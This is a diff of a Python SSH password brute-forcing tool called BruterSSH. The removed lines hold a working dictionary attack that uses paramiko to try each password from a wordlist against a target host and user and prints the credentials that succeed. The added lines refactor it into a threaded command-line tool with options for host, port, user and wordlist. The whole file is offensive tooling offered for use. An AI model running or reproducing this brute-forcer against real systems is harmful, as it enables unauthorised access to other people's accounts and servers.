@@ -5,41 +5,22 @@
 #     +	          BruterSSH          +
 #     +                              +
 #     ++++++++++++++++++++++++++++++++
-#Created by Gr4y_kt
-#My Github ---> https://github.com/Gr4ykt
+#			  Created by Gr4ykt
+#	My Github ---> https://github.com/Gr4ykt
 
-import sys, paramiko, time, signal
+import signal, argparse
 from pwn import *
-#ctrl_c
-def def_handler(sig, frame):
-	print("\n[!]Saliendo de {}".format(sys.argv[0]))
-	sys.exit(1)
+from functions.handler_control import def_handler
+from functions.ssh_brute import ssh_brute
 
 signal.signal(signal.SIGINT, def_handler)
-
-if len(sys.argv) < 3:
-	print("[!] Use: {} <host> <port> <user> <dictionary>".format(sys.argv[0]))
-	sys.exit(1)
+parser = argparse.ArgumentParser(description="SSH Brute")
+parser.add_argument('-i', '--host', type=str, required=True)
+parser.add_argument('-p', '--port', type=int, required=False, default=22)
+parser.add_argument('-u', '--username', type=str, required=True)
+parser.add_argument('-d', '--dir', type=str, required=True)
+parser.add_argument('-t', '--threads', type=int, required=False, default=1)
+args = parser.parse_args()
 
 if __name__ == '__main__':
-	host = sys.argv[1]
-	port = sys.argv[2]
-	user = sys.argv[3]
-	dir  = sys.argv[4]
-
-	p1 = log.progress("")
-	with open(dir, 'r') as fp:
-		for password in fp.read().splitlines():
-			p1.status("Try with: %s"%(password))
-			cliente = paramiko.SSHClient()
-			cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
-			try:
-				cliente.connect(host, port=port, username=user, password=password)
-				print("Login succesfull: {}:{}".format(user,password))
-				break
-
-			except:
-				pass
-
-			time.sleep(1)
+	ssh_brute(args.host, args.port, args.username, args.dir, args.threads)
